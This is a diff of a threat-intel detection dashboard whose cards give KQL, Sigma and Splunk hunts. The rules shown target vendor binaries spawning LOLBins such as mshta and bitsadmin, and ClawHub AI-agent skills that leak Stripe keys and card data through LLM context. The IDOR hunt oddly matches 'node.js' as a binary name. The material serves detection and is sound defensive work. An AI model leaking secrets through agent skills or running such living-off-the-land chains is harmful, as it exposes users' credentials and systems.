+   or NewProcessName endswith &quot;\rundll32.exe&quot;
+   or NewProcessName endswith &quot;\regsvr32.exe&quot;
+   or NewProcessName endswith &quot;\mshta.exe&quot;
+   or NewProcessName endswith &quot;\wscript.exe&quot;
+   or NewProcessName endswith &quot;\cscript.exe&quot;
+   or NewProcessName endswith &quot;\wmic.exe&quot;
+   or NewProcessName endswith &quot;\bitsadmin.exe&quot;
+| project TimeGenerated, Computer, Account, ParentProcessName,
+          NewProcessName, CommandLine
+| order by TimeGenerated desc
+</code></pre></div>
+    <div class="tab-content" id="art-568-uc2-sigma"><pre><button class="copy-btn">COPY</button><code>title: Trusted Vendor Binary Launching Unusual Children
+id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d09
+status: experimental
+description: |
+    A signed vendor binary (in the article&#x27;s named-vendors list)
+    spawning script-host or LOLBin children. Strongest signal when
+    paired with a recent CVE / supply-chain advisory naming the same
+    vendor.
+references:
+    - https://attack.mitre.org/techniques/T1195/
+author: Clankerusecase
+date: 2026/05/02
+tags:
+    - attack.t1195
+    - attack.initial-access
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_child:
+        Image|endswith:
+            - &#x27;\powershell.exe&#x27;
+            - &#x27;\pwsh.exe&#x27;
+            - &#x27;\cmd.exe&#x27;
+            - &#x27;\rundll32.exe&#x27;
+            - &#x27;\regsvr32.exe&#x27;
+            - &#x27;\mshta.exe&#x27;
+            - &#x27;\wscript.exe&#x27;
+            - &#x27;\cscript.exe&#x27;
+            - &#x27;\wmic.exe&#x27;
+            - &#x27;\bitsadmin.exe&#x27;
+    selection_parent_vendor:
+        ParentImage|contains:
+            - &#x27;\Program Files\&#x27;
+            - &#x27;\Program Files (x86)\&#x27;
+    condition: selection_child and selection_parent_vendor
+falsepositives:
+    - Many — installers and updaters legitimately spawn children. Pin
+      the parent path to specific vendor binaries observed in the
+      article before alerting.
+level: medium
+</code></pre></div>
+    <div class="tab-content" id="art-568-uc2-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-568-uc2-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-568-uc2-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-568-uc2-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
+    from datamodel=Endpoint.Processes
+    where Processes.parent_process_name IN (&quot;setup.exe&quot;,&quot;installer.exe&quot;,&quot;update.exe&quot;)
+      AND Processes.process_name IN (&quot;powershell.exe&quot;,&quot;cmd.exe&quot;,&quot;rundll32.exe&quot;,&quot;regsvr32.exe&quot;,&quot;mshta.exe&quot;,&quot;wscript.exe&quot;,&quot;cscript.exe&quot;,&quot;wmic.exe&quot;,&quot;bitsadmin.exe&quot;)
+    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
+| `drop_dm_object_name(Processes)`</code></pre><pre class="spl-mode-body" id="art-568-uc2-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
+    from datamodel=Endpoint.Processes
+    where Processes.parent_process_name IN (&quot;setup.exe&quot;,&quot;installer.exe&quot;,&quot;update.exe&quot;)
+      AND Processes.process_name IN (&quot;powershell.exe&quot;,&quot;cmd.exe&quot;,&quot;rundll32.exe&quot;,&quot;regsvr32.exe&quot;,&quot;mshta.exe&quot;,&quot;wscript.exe&quot;,&quot;cscript.exe&quot;,&quot;wmic.exe&quot;,&quot;bitsadmin.exe&quot;)
+    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
+| `drop_dm_object_name(Processes)`</code></pre></div></div>
+  </div>
+</details>
+<details class="uc" data-uc-slug="8649cd543e" data-platforms="def,sent,spl" data-targets="windows">
+  <summary>
+    <span class="uc-title">Article-specific behavioural hunt — From detection to prevention: How Zen stops IDOR vulnerabilities at runtime</span>
+    <span class="uc-phase">Exploitation</span>
+    <span class="uc-conf high">High</span>
+    <button class="share-btn" data-share-uc="8649cd543e" title="Copy share link to this UC" aria-label="Copy share link">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
+    </button>
+  </summary>
+  <div class="uc-body">
+    <div class="uc-desc">Auto-generated hunt targeting the specific binaries, paths, registry locations and command-line fragments named in this article. Hunting tier — needs analyst review and environment tuning before promotion to alerting.</div>
+    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="User Execution: Malicious File">T1204.002</span></div>
+    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Endpoint.Processes</span> <span class="ind">Endpoint.Filesystem</span> <span class="ind">Endpoint.Registry</span></div>
+    
+    <div class="tabs">
+      <button class="tab-btn active" data-target="art-568-uc3-kql">Defender KQL</button>
+      <button class="tab-btn" data-target="art-568-uc3-sentinel">Sentinel KQL</button>
+      <button class="tab-btn" data-target="art-568-uc3-spl">Splunk SPL (CIM)</button>
+    </div>
+    <div class="tab-content active" id="art-568-uc3-kql"><pre><button class="copy-btn">COPY</button><code>// Article-specific bespoke detection — From detection to prevention: How Zen stops IDOR vulnerabilities at runtime
+// Hunts the actual binaries / paths / commandline fragments named
+// in the article instead of a generic technique-class template.
+DeviceProcessEvents
+| where Timestamp &gt; ago(30d)
+| where (FileName in~ (&quot;node.js&quot;))
+| project Timestamp, DeviceName, AccountName, FileName,
+          FolderPath, ProcessCommandLine,
+          InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by Timestamp desc
+
+// File-creation events for the named binaries / paths
+DeviceFileEvents
+| where Timestamp &gt; ago(30d)
+| where ActionType in (&quot;FileCreated&quot;,&quot;FileModified&quot;)
+| where (FileName in~ (&quot;node.js&quot;))
+| project Timestamp, DeviceName, AccountName, FolderPath,
+          FileName, ActionType, InitiatingProcessFileName,
+          InitiatingProcessCommandLine
+| order by Timestamp desc</code></pre></div>
+    <div class="tab-content" id="art-568-uc3-sentinel"><pre><button class="copy-btn">COPY</button><code>// Microsoft Sentinel — auto-derived from the Defender XDR hunt.
+// Requires the Microsoft 365 Defender data connector (streams the
+// advanced-hunting tables into Sentinel; Timestamp → TimeGenerated).
+// Article-specific bespoke detection — From detection to prevention: How Zen stops IDOR vulnerabilities at runtime
+// Hunts the actual binaries / paths / commandline fragments named
+// in the article instead of a generic technique-class template.
+DeviceProcessEvents
+| where TimeGenerated &gt; ago(30d)
+| where (FileName in~ (&quot;node.js&quot;))
+| project TimeGenerated, DeviceName, AccountName, FileName,
+          FolderPath, ProcessCommandLine,
+          InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by TimeGenerated desc
+
+// File-creation events for the named binaries / paths
+DeviceFileEvents
+| where TimeGenerated &gt; ago(30d)
+| where ActionType in (&quot;FileCreated&quot;,&quot;FileModified&quot;)
+| where (FileName in~ (&quot;node.js&quot;))
+| project TimeGenerated, DeviceName, AccountName, FolderPath,
+          FileName, ActionType, InitiatingProcessFileName,
+          InitiatingProcessCommandLine
+| order by TimeGenerated desc</code></pre></div>
+    <div class="tab-content" id="art-568-uc3-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-568-uc3-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-568-uc3-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-568-uc3-spl-acc"><button class="copy-btn">COPY</button><code>``` Article-specific bespoke detection — From detection to prevention: How Zen stops IDOR vulnerabilities at runtime ```
+| tstats `summariesonly` count earliest(_time) AS firstTime latest(_time) AS lastTime
+    from datamodel=Endpoint.Processes
+    where (Processes.process_name IN (&quot;node.js&quot;))
+    by Processes.dest, Processes.user, Processes.process_name,
+       Processes.process, Processes.parent_process_name, Processes.process_path
+| `drop_dm_object_name(Processes)`
+| `security_content_ctime(firstTime)`
+| append [
+| tstats `summariesonly` count
+    from datamodel=Endpoint.Filesystem
+    where Filesystem.action IN (&quot;created&quot;,&quot;modified&quot;)
+      AND (Filesystem.file_name IN (&quot;node.js&quot;))
+    by Filesystem.dest, Filesystem.user, Filesystem.process_name,
+       Filesystem.file_path, Filesystem.file_name
+| `drop_dm_object_name(Filesystem)`
+]</code></pre><pre class="spl-mode-body" id="art-568-uc3-spl-raw"><button class="copy-btn">COPY</button><code>``` Article-specific bespoke detection — From detection to prevention: How Zen stops IDOR vulnerabilities at runtime ```
+| tstats summariesonly=false count earliest(_time) AS firstTime latest(_time) AS lastTime
+    from datamodel=Endpoint.Processes
+    where (Processes.process_name IN (&quot;node.js&quot;))
+    by Processes.dest, Processes.user, Processes.process_name,
+       Processes.process, Processes.parent_process_name, Processes.process_path
+| `drop_dm_object_name(Processes)`
+| `security_content_ctime(firstTime)`
+| append [
+| tstats summariesonly=false count
+    from datamodel=Endpoint.Filesystem
+    where Filesystem.action IN (&quot;created&quot;,&quot;modified&quot;)
+      AND (Filesystem.file_name IN (&quot;node.js&quot;))
+    by Filesystem.dest, Filesystem.user, Filesystem.process_name,
+       Filesystem.file_path, Filesystem.file_name
+| `drop_dm_object_name(Filesystem)`
+]</code></pre></div></div>
+  </div>
+</details></div>
+</article>
 <article class="card" id="art-569" data-art-slug="2026-02-16-npm-backdoor-lets-hackers-hijack-gambling-outcomes"
   data-phases="actions,c2,delivery,exploit,install,recon" data-sev="high"
   data-techs="T1190,T1195.002,T1555.003"
@@ -9752,941 +10333,6 @@ DeviceTvmSoftwareVulnerabilities
     by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
 | `drop_dm_object_name(Vulnerabilities)`
 | sort - severity</code></pre></div></div>
-  </div>
-</details></div>
-</article>
-<article class="card" id="art-606" data-art-slug="2026-02-05-280-leaky-skills-how-openclaw-clawhub-are-exposing-api-keys-"
-  data-phases="actions,c2,delivery,exploit,install,recon" data-sev="high"
-  data-techs="T1190"
-  data-sources="Snyk"
-  data-platforms="datadog,def,falcon,sent,sigma,spl"
-  data-splunk-cats="endpoint"
-  data-targets="linux,windows"
-  data-uc-count="3" data-llm-uc-count="3"
-  data-search="280+ Leaky Skills: How OpenClaw &amp; ClawHub Are Exposing API Keys and PII Discover how 7.1% of AI agent skills are designed to leak secrets, PII, and API keys through LLM context. Learn to defend with Evo &amp; mcp-scan.  T1190 [LLM] Installation of credential-leaking ClawHub skills (moltyverse-email, buy-anything, prompt-log, youtube-data) [LLM] AI agent skill leaks Stripe key or card PAN/CVC verbatim in curl command line [LLM] AI session-log harvest via prompt-log extract.sh writing markdown with embedded secrets">
-  <div class="sev-ribbon high">High</div>
-  <button class="share-btn card-share" data-share-art="2026-02-05-280-leaky-skills-how-openclaw-clawhub-are-exposing-api-keys-" title="Copy share link to this article" aria-label="Copy share link">
-    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
-  </button>
-  <h2><a href="https://snyk.io/blog/openclaw-skills-credential-leaks-research/" target="_blank" rel="noopener">280+ Leaky Skills: How OpenClaw &amp; ClawHub Are Exposing API Keys and PII</a></h2>
-  <div class="source-badges"><span class="source-badge ">Snyk</span></div>
-  <div class="pubmeta">
-    <span>2026-02-05</span>
-    <span>3 use cases</span>
-    <span>1 technique</span>
-    <span>5 kill-chain phases detected</span>
-  </div>
-  <p class="summary">Discover how 7.1% of AI agent skills are designed to leak secrets, PII, and API keys through LLM context. Learn to defend with Evo &amp; mcp-scan.</p>
-  <div class="ind-group"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Exploit Public-Facing Application">T1190</span></div>
-  <div class="action-row">
-    <button class="btn btn-kc" data-target="art-606-kc"><svg class="kc-chev" width="11" height="11" viewBox="0 0 12 12" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="3 4.5 6 7.5 9 4.5"/></svg><span class="kc-label">Show kill chain</span></button>
-    <button class="btn btn-hunt" data-hunt-art="art-606"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M21 21 L16.65 16.65"/></svg><span>Hunt IOCs</span></button>
-    <span class="btn-meta">Click any ATT&amp;CK pill below to open it on the Matrix</span>
-  </div>
-  <div class="killchain" id="art-606-kc">
-  <div class="kc3d"><div class="kc-cell hit">
-  <div class="num">Phase 1</div>
-  <div class="name">Reconnaissance</div>
-  <div class="marker">Detected</div>
-</div>
-<div class="kc-cell ">
-  <div class="num">Phase 2</div>
-  <div class="name">Weaponization</div>
-  <div class="marker">—</div>
-</div>
-<div class="kc-cell hit">
-  <div class="num">Phase 3</div>
-  <div class="name">Delivery</div>
-  <div class="marker">Detected</div>
-</div>
-<div class="kc-cell hit">
-  <div class="num">Phase 4</div>
-  <div class="name">Exploitation</div>
-  <div class="marker">Detected</div>
-</div>
-<div class="kc-cell hit">
-  <div class="num">Phase 5</div>
-  <div class="name">Installation</div>
-  <div class="marker">Detected</div>
-</div>
-<div class="kc-cell inferred">
-  <div class="num">Phase 6</div>
-  <div class="name">Command &amp; Control</div>
-  <div class="marker">Likely</div>
-</div>
-<div class="kc-cell hit">
-  <div class="num">Phase 7</div>
-  <div class="name">Actions on Objectives</div>
-  <div class="marker">Detected</div>
-</div></div>
-  <div class="kc-detail"><div class="phase-line hit"><strong>Reconnaissance.</strong> Attacker researches the target — OSINT, scanning, enumeration.</div>
-<div class="phase-line "><strong>Weaponization.</strong> Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).</div>
-<div class="phase-line hit"><strong>Delivery.</strong> Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).</div>
-<div class="phase-line hit"><strong>Exploitation.</strong> Triggering the exploit — vulnerability/macro/trust abuse to execute code.</div>
-<div class="phase-line hit"><strong>Installation.</strong> Establishing persistence on the host — backdoor, service, scheduled task, registry key. <em>→ [LLM] Installation of credential-leaking ClawHub skills (moltyverse-email, buy-anything, prompt-log, youtube-data)</em></div>
-<div class="phase-line inferred"><strong>Command &amp; Control.</strong> Beacon to attacker infrastructure for control and tasking.</div>
-<div class="phase-line hit"><strong>Actions on Objectives.</strong> Lateral movement, credential dumping, data theft, ransomware, sabotage. <em>→ [LLM] AI agent skill leaks Stripe key or card PAN/CVC verbatim in curl command line · [LLM] AI session-log harvest via prompt-log extract.sh writing markdown with embedded secrets</em></div></div>
-</div>
-  <div class="usecases"><details class="uc" data-uc-slug="f33b35ffab" data-platforms="datadog,def,falcon,sent,sigma,spl" data-targets="windows" open>
-  <summary>
-    <span class="uc-title">Installation of credential-leaking ClawHub skills (moltyverse-email, buy-anything, prompt-log, youtube-data)</span>
-    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Installation</span>
-    <span class="uc-conf high">High</span>
-    <button class="share-btn" data-share-uc="f33b35ffab" title="Copy share link to this UC" aria-label="Copy share link">
-      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
-    </button>
-  </summary>
-  <div class="uc-body">
-    <div class="uc-desc">Detects installation of the four ClawHub marketplace skills Snyk specifically named as exposing API keys, PII and credit card data through LLM context windows. Anchored on the exact `clawhub install &lt;skill&gt;` invocations and the `npm install -g clawhub` bootstrap command from the article.
-
-Rationale: Anchors on the four skill names Snyk explicitly named (moltyverse-email, buy-anything, prompt-log, youtube-data) and the clawhub bootstrap command — none of these strings appear in legitimate non-AI-agent dev tooling, so FP rate is naturally low. No external sources required; article gives literal install commands.</div>
-    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Compromise Software Supply Chain">T1195.002</span> <span class="ind tech" title="Unix Shell">T1059.004</span></div>
-    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Endpoint.Processes</span></div>
-    <details class="uc-fp"><summary>Expected false positives · estimated rate: low<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>Internal security researcher running the same Snyk audit on a sandbox host</li><li>Blue-team analyst installing the skill in a contained lab to reproduce vulnerability</li><li>AI-platform team evaluating the ClawHub marketplace for an org-wide allow/deny policy</li><li>Developer legitimately testing an AI agent in a personal sandbox after the vuln is disclosed but before the skill is delisted</li></ul><div class="uc-fp-filter"><span class="ind-label">Suppression filter</span><pre><code>| where InitiatingProcessParentFileName !in~ (&quot;snyk-cli.exe&quot;,&quot;snyk.exe&quot;) and InitiatingProcessCommandLine !has &quot;sandbox&quot; and InitiatingProcessCommandLine !has &quot;evo-agent-security-analyzer&quot;</code></pre></div></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">Step 1 (Triage): Confirm the installing user is in an authorized AI-platform / dev role. Capture the exact skill name from ProcessCommandLine and read the skill&#x27;s SKILL.md from ~/.clawhub/skills/&lt;skill&gt;/SKILL.md to verify the insecure pattern. Step 2 (Contain): If unauthorized, run `clawhub uninstall &lt;skill&gt;` on the host, disable the user&#x27;s AI-agent session, and rotate any credentials that may have been handed to the agent in that session (Stripe keys, moltyverse API keys, any sensitive env vars). Step 3 (Hunt): On the same host, search DeviceProcessEvents for the next 24h of curl calls referencing api.stripe.com/v1/tokens or moltyverse.email (UC2 logic), and search DeviceFileEvents for any .prompt-log/*.md exports (UC3 logic) that may already contain leaked secrets.</div></details>
-    <div class="tabs">
-      <button class="tab-btn active" data-target="art-606-uc0-kql">Defender KQL</button>
-      <button class="tab-btn" data-target="art-606-uc0-sentinel">Sentinel KQL</button>
-      <button class="tab-btn" data-target="art-606-uc0-sigma">Sigma</button>
-      <button class="tab-btn" data-target="art-606-uc0-datadog">Datadog</button>
-      <button class="tab-btn" data-target="art-606-uc0-falcon">Falcon LogScale</button>
-      <button class="tab-btn" data-target="art-606-uc0-spl">Splunk SPL (CIM)</button>
-    </div>
-    <div class="tab-content active" id="art-606-uc0-kql"><pre><button class="copy-btn">COPY</button><code>DeviceProcessEvents
-| where Timestamp &gt; ago(7d)
-| where ProcessCommandLine has &quot;clawhub&quot;
-| where ProcessCommandLine has_any (&quot;clawhub install moltyverse-email&quot;,&quot;clawhub install buy-anything&quot;,&quot;clawhub install prompt-log&quot;,&quot;clawhub install youtube-data&quot;,&quot;npm install -g clawhub&quot;)
-| where AccountName !endswith &quot;$&quot;
-| project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName, SHA256
-| order by Timestamp desc</code></pre></div>
-    <div class="tab-content" id="art-606-uc0-sentinel"><pre><button class="copy-btn">COPY</button><code>SecurityEvent
-| where TimeGenerated &gt; ago(7d)
-| where EventID == 4688
-| where CommandLine has &quot;clawhub&quot;
-| where CommandLine has_any (&quot;clawhub install moltyverse-email&quot;,&quot;clawhub install buy-anything&quot;,&quot;clawhub install prompt-log&quot;,&quot;clawhub install youtube-data&quot;,&quot;npm install -g clawhub&quot;)
-| where AccountName !endswith &quot;$&quot;
-| project TimeGenerated, Computer, Account, NewProcessName, CommandLine, ParentProcessName
-| order by TimeGenerated desc</code></pre></div>
-    <div class="tab-content" id="art-606-uc0-sigma"><pre><button class="copy-btn">COPY</button><code>title: Installation of Credential-Leaking ClawHub Agent Skills
-id: 8a1f2b6c-3d4e-4f5a-9b0c-1d2e3f4a5b6c
-description: Detects installation of ClawHub marketplace skills (moltyverse-email, buy-anything, prompt-log, youtube-data) Snyk identified as exposing API keys, PII and credit-card data through LLM context windows.
-references:
-  - https://snyk.io/blog/openclaw-skills-credential-leaks-research/
-author: Detection Engineering
-date: 2026/02/05
-tags:
-  - attack.initial_access
-  - attack.t1195.002
-logsource:
-  category: process_creation
-  product: windows
-detection:
-  selection:
-    CommandLine|contains:
-      - &#x27;clawhub install moltyverse-email&#x27;
-      - &#x27;clawhub install buy-anything&#x27;
-      - &#x27;clawhub install prompt-log&#x27;
-      - &#x27;clawhub install youtube-data&#x27;
-      - &#x27;npm install -g clawhub&#x27;
-  condition: selection
-level: medium</code></pre></div>
-    <div class="tab-content" id="art-606-uc0-datadog"><pre><button class="copy-btn">COPY</button><code>source:windows.sysmon @EventID:1 @CommandLine:(&quot;clawhub install moltyverse-email&quot; OR &quot;clawhub install buy-anything&quot; OR &quot;clawhub install prompt-log&quot; OR &quot;clawhub install youtube-data&quot; OR &quot;npm install -g clawhub&quot;)</code></pre></div>
-    <div class="tab-content" id="art-606-uc0-falcon"><pre><button class="copy-btn">COPY</button><code>#event_simpleName=ProcessRollup2
-| CommandLine=/clawhub\s+install\s+(moltyverse-email|buy-anything|prompt-log|youtube-data)|npm\s+install\s+-g\s+clawhub/i
-| groupBy([aid, ComputerName, UserName, ImageFileName, CommandLine], function=count())</code></pre></div>
-    <div class="tab-content" id="art-606-uc0-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-606-uc0-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-606-uc0-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-606-uc0-spl-acc"><button class="copy-btn">COPY</button><code>| tstats summariesonly=true count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.process_name=&quot;npm.exe&quot; OR Processes.process_name=&quot;node.exe&quot; OR Processes.process_name=&quot;clawhub.exe&quot; OR Processes.process_name=&quot;bash.exe&quot; OR Processes.process_name=&quot;pwsh.exe&quot; OR Processes.process_name=&quot;powershell.exe&quot;) AND (Processes.process=&quot;*clawhub install moltyverse-email*&quot; OR Processes.process=&quot;*clawhub install buy-anything*&quot; OR Processes.process=&quot;*clawhub install prompt-log*&quot; OR Processes.process=&quot;*clawhub install youtube-data*&quot; OR Processes.process=&quot;*npm install -g clawhub*&quot;) by Processes.dest Processes.user Processes.process Processes.parent_process_name Processes.process_name | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`</code></pre><pre class="spl-mode-body" id="art-606-uc0-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.process_name=&quot;npm.exe&quot; OR Processes.process_name=&quot;node.exe&quot; OR Processes.process_name=&quot;clawhub.exe&quot; OR Processes.process_name=&quot;bash.exe&quot; OR Processes.process_name=&quot;pwsh.exe&quot; OR Processes.process_name=&quot;powershell.exe&quot;) AND (Processes.process=&quot;*clawhub install moltyverse-email*&quot; OR Processes.process=&quot;*clawhub install buy-anything*&quot; OR Processes.process=&quot;*clawhub install prompt-log*&quot; OR Processes.process=&quot;*clawhub install youtube-data*&quot; OR Processes.process=&quot;*npm install -g clawhub*&quot;) by Processes.dest Processes.user Processes.process Processes.parent_process_name Processes.process_name | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`</code></pre></div></div>
-  </div>
-</details>
-<details class="uc" data-uc-slug="e2277c1c1b" data-platforms="datadog,def,falcon,sent,sigma,spl" data-targets="windows">
-  <summary>
-    <span class="uc-title">AI agent skill leaks Stripe key or card PAN/CVC verbatim in curl command line</span>
-    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Actions on Objectives</span>
-    <span class="uc-conf high">High</span>
-    <button class="share-btn" data-share-uc="e2277c1c1b" title="Copy share link to this UC" aria-label="Copy share link">
-      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
-    </button>
-  </summary>
-  <div class="uc-body">
-    <div class="uc-desc">Hunts the exact insecure pattern from buy-anything v2.0.0 and moltyverse-email v1.1.0: a curl/bash invocation that embeds a live Stripe publishable key (pk_live_*) or raw card number plus CVC into the command line for api.stripe.com/v1/tokens, or hits api.moltyverse.email / moltyverse.email/inbox with the API key in the request. These secrets flow through process audit logs, EDR cmd-line capture, and the LLM provider&#x27;s conversation history.
-
-Rationale: Article verbatim shows the curl with `-u &quot;pk_live_51LgDhr...&quot; -d &quot;card[number]=4242...&quot; -d &quot;card[cvc]=123&quot;` against api.stripe.com/v1/tokens and references api.moltyverse.email in the skill metadata. The combination of a Stripe/moltyverse endpoint with raw card form-fields or live Stripe-key prefixes in a single process command line is article-specific and effectively never occurs in well-architected payment flows (real apps post tokens, not PANs).</div>
-    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Credentials In Files">T1552.001</span> <span class="ind tech" title="Application Layer Protocol: Web Protocols">T1071.001</span> <span class="ind tech" title="Unix Shell">T1059.004</span></div>
-    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Endpoint.Processes</span></div>
-    <details class="uc-fp"><summary>Expected false positives · estimated rate: low<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>Developer testing a Stripe integration with the test PAN 4242424242424242 (Stripe documentation example)</li><li>Authorized SOC blue-team reproducing the Snyk PoC in a contained lab</li><li>Legacy server-side Stripe tokenization that still does direct PAN tokenization (technically a PCI finding regardless)</li><li>Snyk Evo Agent Security Analyzer or similar SAST tool scanning the SKILL.md file (would appear in static-analysis tooling cmdline, not as curl)</li></ul><div class="uc-fp-filter"><span class="ind-label">Suppression filter</span><pre><code>| where ProcessCommandLine !has &quot;4242424242424242&quot; or ProcessCommandLine !has &quot;test&quot; | where InitiatingProcessFolderPath !has &quot;\\stripe-cli\\&quot; and InitiatingProcessCommandLine !has &quot;--testmode&quot;</code></pre></div></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">Step 1 (Triage): Extract every secret in the captured ProcessCommandLine — Stripe key prefix (pk_live_*/sk_live_*), card PAN, CVC, exp, moltyverse `?key=` value. Note exact timestamp, host, user, parent process (likely bash/AI-agent runtime). Step 2 (Contain): Rotate the Stripe key immediately in the Stripe dashboard (Roll); revoke the moltyverse API key; freeze any cards captured (issuer contact); kill the AI-agent session; remove the buy-anything / moltyverse-email skill (`clawhub uninstall`). Step 3 (Hunt): Pull the agent&#x27;s session .jsonl from ~/.codex/sessions, ~/.claude/projects, or ~/.clawdbot/agents/main/sessions and grep for the leaked values; pull LLM-provider audit logs (OpenAI / Anthropic) for any conversations carrying the same secrets; look for prompt-log .md exports (UC3) that already shared the cleartext into a markdown artifact.</div></details>
-    <div class="tabs">
-      <button class="tab-btn active" data-target="art-606-uc1-kql">Defender KQL</button>
-      <button class="tab-btn" data-target="art-606-uc1-sentinel">Sentinel KQL</button>
-      <button class="tab-btn" data-target="art-606-uc1-sigma">Sigma</button>
-      <button class="tab-btn" data-target="art-606-uc1-datadog">Datadog</button>
-      <button class="tab-btn" data-target="art-606-uc1-falcon">Falcon LogScale</button>
-      <button class="tab-btn" data-target="art-606-uc1-spl">Splunk SPL (CIM)</button>
-    </div>
-    <div class="tab-content active" id="art-606-uc1-kql"><pre><button class="copy-btn">COPY</button><code>DeviceProcessEvents
-| where Timestamp &gt; ago(7d)
-| where ProcessCommandLine has_any (&quot;api.stripe.com/v1/tokens&quot;,&quot;moltyverse.email/inbox&quot;,&quot;api.moltyverse.email&quot;)
-| where ProcessCommandLine has_any (&quot;card[number]=&quot;,&quot;card[cvc]=&quot;,&quot;pk_live_&quot;,&quot;sk_live_&quot;)
-| where AccountName !endswith &quot;$&quot;
-| project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName, SHA256
-| order by Timestamp desc</code></pre></div>
-    <div class="tab-content" id="art-606-uc1-sentinel"><pre><button class="copy-btn">COPY</button><code>SecurityEvent
-| where TimeGenerated &gt; ago(7d)
-| where EventID == 4688
-| where CommandLine has_any (&quot;api.stripe.com/v1/tokens&quot;,&quot;moltyverse.email/inbox&quot;,&quot;api.moltyverse.email&quot;)
